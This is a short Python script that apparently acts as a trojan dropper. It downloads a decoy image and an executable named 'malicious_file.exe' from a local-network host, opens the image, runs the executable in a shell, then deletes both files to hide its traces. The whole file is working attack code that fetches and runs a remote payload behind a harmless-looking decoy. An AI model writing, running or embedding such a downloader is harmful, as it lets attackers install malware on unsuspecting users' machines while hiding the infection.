#!/usr/bin/python

import requests
import subprocess
import os
import tempfile

def download(url):
	get_response=requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name,"wb") as out_file:
		out_file.write(get_response.content)
		
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.1.33/car.jpg")
subprocess.Popen("car.jpg",shell=True)

download("http://192.168.1.33/malicious_file.exe")
subprocess.call("malicious_file.exe",shell=True)

os.remove("car.jpg")
os.remove("malicious_file.exe")
